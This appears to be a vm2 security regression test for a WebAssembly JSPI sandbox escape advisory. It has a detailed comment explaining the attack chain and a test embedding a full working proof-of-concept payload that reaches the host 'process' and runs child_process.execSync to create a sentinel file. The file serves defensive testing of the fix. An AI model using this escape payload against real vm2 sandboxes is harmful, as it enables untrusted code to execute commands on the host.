/**
 * GHSA-6j2x-vhqr-qr7q — vm2 sandbox escape via WebAssembly JSPI species bypass
 *
 * ## Vulnerability
 *
 * The WebAssembly JavaScript Promise Integration (JSPI) API — `WebAssembly.promising`
 * and `WebAssembly.Suspending`, available behind `--experimental-wasm-jspi` on
 * Node 24 and enabled by default on Node 26+ — returns Promise-shaped objects whose
 * `[[Prototype]]` chain points DIRECTLY at the host realm's `Promise.prototype`
 * without going through any bridge proxy.
 *
 * Sandbox property access on such a promise resolves `p.then` / `p.catch` /
 * `p.finally` to the host-realm native methods via the cross-realm prototype walk,
 * completely bypassing:
 *   1. the sandbox-side `globalPromise.prototype.then|catch` overrides (the JSPI
 *      promise's prototype is NOT `globalPromise.prototype`, so the override is
 *      never reached),
 *   2. `resetPromiseSpecies` (only invoked from those overrides),
 *   3. the bridge `apply`-trap callback wrapping for host Promise methods (which
 *      only fires for bridge-proxied host promises — JSPI promises aren't
 *      proxied at all).
 *
 * The canonical attack chain on Node 26:
 *
 * ```js
 * const p = WebAssembly.promising(wasmFn)();      // sandbox-realm, cross-realm proto
 * Object.defineProperty(p, 'constructor', { get(){ return F; }});  // hits raw p
 * p.finally(() => {});                            // V8's host-realm finally runs
 * ```
 *
 * V8's host-realm `Promise.prototype.finally` reads `p.constructor` →
 * attacker's sandbox class `F` → builds a result capability whose `[[Reject]]`
 * is the raw sandbox closure F supplied. When the JSPI promise rejects with
 * a host-realm `TypeError` (e.g. from `WebAssembly.compileStreaming(0)`),
 * V8 calls that closure directly with the raw host error. Inside F's reject:
 *
 * ```js
 * e.constructor.constructor('return process')();  // host Function — RCE
 * ```
 *
 * `Function.[[Realm]]` is host, so the constructed function evaluates in the
 * host realm and `process` resolves.
 *
 * ## Fix
 *
 * Remove `WebAssembly.promising` and `WebAssembly.Suspending` from the
 * sandbox global at bootstrap, mirroring the existing `WebAssembly.JSTag`
 * deletion (GHSA-9qj6-qjgg-37qq). Without `Suspending`, a wasm module cannot
 * import a JS function as a suspending import; without `promising`, sandbox
 * cannot promote a wasm function into a JSPI export. JSPI is the only known
 * primitive that produces a sandbox-visible Promise whose prototype crosses
 * realms without bridge interposition.
 *
 * ## Defense invariant restored
 *
 * Every Promise object reachable from sandbox code is either (a) sandbox-
 * realm with `globalPromise.prototype` in its `[[Prototype]]` chain (so the
 * vm2 overrides apply), or (b) a bridge proxy of a host-realm Promise (so
 * the bridge `apply`-trap interception applies). JSPI broke this dichotomy
 * by producing a third class — sandbox-realm with a HOST `Promise.prototype`
 * — that neither defense layer can intercept.
 */

'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { VM } = require('../../../lib/main.js');

// JSPI was introduced behind `--experimental-wasm-jspi` in Node 24 and is
// enabled by default on Node 26+. Older Nodes don't expose the constructors
// at all, so the attack surface doesn't exist there.
const HAS_JSPI = typeof WebAssembly !== 'undefined'
	&& typeof WebAssembly.promising === 'function'
	&& typeof WebAssembly.Suspending === 'function';

if (typeof it.cond !== 'function') {
	it.cond = function (name, cond, fn) {
		return cond ? it(name, fn) : it.skip(name, fn);
	};
}

describe('GHSA-6j2x-vhqr-qr7q — WebAssembly JSPI sandbox escape', function () {
	// Bump the timeout — the canonical PoC needs a wasm instantiate round-trip
	// plus a microtask drain before the rejection lands.
	this.timeout(5000);

	it.cond('removes WebAssembly.promising from the sandbox global', HAS_JSPI, function () {
		const r = new VM().run(`typeof WebAssembly.promising`);
		assert.strictEqual(r, 'undefined', 'WebAssembly.promising must be unreachable from sandbox');
	});

	it.cond('removes WebAssembly.Suspending from the sandbox global', HAS_JSPI, function () {
		const r = new VM().run(`typeof WebAssembly.Suspending`);
		assert.strictEqual(r, 'undefined', 'WebAssembly.Suspending must be unreachable from sandbox');
	});

	it.cond('canonical PoC: no host filesystem side-effect', HAS_JSPI, function () {
		return new Promise(function (resolve, reject) {
			const sentinel = path.resolve(__dirname, 'pwned-canonical');
			try { fs.unlinkSync(sentinel); } catch (e) { /* not present */ }

			const vm = new VM();
			let inner;
			try {
				inner = vm.run(`
					(()=>{let b=Uint8Array.of(0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,109,1,102,0,0,3,2,1,0,7,7,1,3,114,117,110,0,1,10,6,1,4,0,16,0,11);
					try {
						WebAssembly.instantiate(b,{m:{f:new WebAssembly.Suspending(()=>WebAssembly.compileStreaming(Promise.resolve(0)))}}).then(r=>{
							let p=WebAssembly.promising(r.instance.exports.run)();
							class F{constructor(x){this.s=0;this.q=[];x(v=>{this.s=1;this.v=v;for(let i of this.q)if(i[0])i[0](v)},e=>{
								try {
									let P=e.constructor.constructor('return process')();
									P.mainModule.require('child_process').execSync('touch ${sentinel}');
									globalThis.__outcome='ESCAPED pid=' + (P && P.pid);
								} catch (err) { globalThis.__outcome='blocked-inner:' + err.message; }
								this.s=2;this.v=e;for(let i of this.q)if(i[1])i[1](e)})}then(f,r){if(this.s==1)return f?f(this.v):this.v;if(this.s==2){if(r)return r(this.v);throw this.v}this.q.push([f,r]);return 0}}
							Object.defineProperty(F,Symbol.species,{get(){return F}});
							Object.defineProperty(p,'constructor',{configurable:true,get(){return F}});
							p.finally(()=>{});
						}, err => { globalThis.__outcome='outer-reject:' + (err && err.message); });
						globalThis.__outcome='setup-ok';
					} catch (e) {
						globalThis.__outcome='blocked-setup:' + e.message;
					}
					return globalThis.__outcome;})()
				`);
			} catch (e) {
				inner = 'vm.run-threw:' + e.message;
			}

			// Wait for any microtasks / wasm instantiation to settle, then assert.
			setTimeout(function () {
				try {
					let outcome;
					try { outcome = vm.run('globalThis.__outcome'); }
					catch (e) { outcome = '(read-failed:' + e.message + ')'; }
					const escaped = fs.existsSync(sentinel);
					if (escaped) {
						try { fs.unlinkSync(sentinel); } catch (e) { /* ignore */ }
					}
					assert.strictEqual(escaped, false, 'host filesystem side-effect must not occur; inner=' + inner + ' outcome=' + outcome);
					// And the setup must have been blocked at the deleted-API boundary.
					assert.ok(
						String(inner).indexOf('blocked-setup:') === 0
							|| String(outcome).indexOf('blocked-setup:') === 0
							|| String(inner).indexOf('vm.run-threw:') === 0,
						'expected setup to fail at the deleted JSPI API; inner=' + inner + ' outcome=' + outcome,
					);
					resolve();
				} catch (e) {
					reject(e);
				}
			}, 1500);
		});
	});

	it.cond('variant: WebAssembly.promising alone is also gone (defense in depth)', HAS_JSPI, function () {
		// Even without Suspending, a wasm function promoted to JSPI via
		// `promising` can produce a sandbox-visible cross-realm-prototype
		// promise. Asserting the broader deletion catches a refactor that
		// might keep one of the two by mistake.
		const r = new VM().run(`
			typeof WebAssembly.promising + ',' + typeof WebAssembly.Suspending
		`);
		assert.strictEqual(r, 'undefined,undefined');
	});

	it.cond(
		'variant: wasm module that imports a Suspending function cannot be instantiated',
		HAS_JSPI,
		function () {
			// The canonical PoC's wasm module imports `f` (a Suspending). Even
			// if an attacker pre-compiles such a module elsewhere and tries to
			// instantiate it in-sandbox, `new WebAssembly.Suspending(...)` is
			// the only way to satisfy that import — and it's gone.
			const r = new VM().run(`
				try {
					new WebAssembly.Suspending(() => {});
					'UNEXPECTED: Suspending still constructable';
				} catch (e) {
					'blocked:' + (e && e.message);
				}
			`);
			assert.ok(/^blocked:/.test(r), 'expected Suspending to be unconstructable, got: ' + r);
		},
	);

	it.cond('regression: vanilla WebAssembly.instantiate still works (no over-broad deletion)', HAS_JSPI, function () {
		// Module: (module (func (export "f") (result i32) i32.const 42))
		const r = new VM().run(`
			const bytes = new Uint8Array([
				0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11
			]);
			(async () => {
				const { instance } = await WebAssembly.instantiate(bytes);
				return instance.exports.f();
			})();
		`);
		// r is a sandbox-realm Promise. Resolve it with a then handler to
		// extract the value into a host-side capture for assertion.
		return new Promise((resolve, reject) => {
			r.then((value) => {
				try {
					assert.strictEqual(value, 42, 'wasm function f() should return 42');
					resolve();
				} catch (e) { reject(e); }
			}, reject);
		});
	});
});
